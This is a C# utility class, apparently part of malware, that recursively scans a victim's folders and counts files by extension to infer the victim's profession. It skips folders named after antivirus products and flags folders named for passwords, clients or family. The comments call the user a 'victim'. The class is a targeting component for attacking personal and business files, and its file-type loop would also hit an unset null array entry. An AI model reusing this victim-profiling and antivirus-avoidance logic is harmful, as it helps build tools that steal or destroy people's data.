using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;


namespace myApp
{
    class Utility
    {
        public enum Jobs
        {
            engineer, // 1
            designer, // 2
            lecturer, // 3
            accountant, // 4
            producer, // 5
            keyWord, // 6
            other // 7
        }

        public string[] skipFolders = new[] {"J_N","J_N1","ZoneAlarm","AVG","Panda","TheHacker","BitDefender","eScan","Trapmine","Avast","McAfee", "Program Files", "Program Files (x86)", "Windows", "Windows.old", "GoogleDrive", "OneDrive", "Downloads" };

        private string[] keyWords = new[] {"family", "client", "project", "wedding", "trip", "important", "password", "code" };

        public static int jobsNum = Enum.GetNames(typeof(Jobs)).Length;

        public string[][] Extensions = new string[jobsNum][];  // be careful: extensions[keyWord] is null 

        public int[] counters = new int[jobsNum]; 

        public Utility() //constructor
        {
            Extensions[(int)Jobs.engineer] = new[] {
                   ".csv", ".html", ".xml", ".c", ".cpp", ".java", ".py", ".cs", ".class", ".sql"
                };
            Extensions[(int)Jobs.designer] = new[] {
                    ".psb", ".psd", ".eps", ".ai", ".png", ".icp", ".jpeg", ".jpg", ".bmp", ".dib", ".ps", ".svg", ".tif", ".tiff", ".jfif", ".gif"
                };
            Extensions[(int)Jobs.producer] = new[] {
                    ".aif", ".wav", ".cda", ".mp3", ".wma", ".wpl", ".mpa", ".mid"
                };
            Extensions[(int)Jobs.lecturer] = new[] {
                    ".pdf",".doc", ".docx", ".ppt", ".pptx", "pptn", ".key", ".odp", ".pps"
                };
            Extensions[(int)Jobs.accountant] = new[] {
                    ".xls", ".xlsx"
                };           
            Extensions[(int)Jobs.other] = new[]
            {
                ".pdf",".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };
        }

        public void countFilesByType(string location, int[] counters)
        {

            string[] childDirectories = Directory.GetDirectories(location);
            string[] files = Directory.GetFiles(location);

            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                foreach (Jobs job in (Jobs[])Enum.GetValues(typeof(Jobs)))
                {
                    if (Extensions[(int)job].Contains(extension))
                    {
                        counters[(int)job]++;
                    }
                }
            }

            for (int i = 0; i < childDirectories.Length; i++)
            {
                string folderName = Path.GetFileName(childDirectories[i]);

                if (!skipFolders.Contains(folderName, StringComparer.OrdinalIgnoreCase) && keyWordFile(folderName) == false)
                {
                    countFilesByType(childDirectories[i], counters);        // recursive
                }
            }

        }  // We don't need it

        public Jobs getJob() // gets the victims job according to the number of files from each type.
        {
            int maxValue = counters.Max();
            Jobs job = (Jobs)counters.ToList().IndexOf(maxValue);
            return job;
        }

        public bool keyWordFile(string name) // checks if the file name includes key word
        {
            Boolean keyWordFolderFound = false;
            foreach (string word in keyWords)
            {
                if (name.IndexOf(word, StringComparison.OrdinalIgnoreCase) != -1) // -1 if word is not a substring, else substring
                {
                    keyWordFolderFound = true;
                }
            }
            return keyWordFolderFound;
        }
    }
}
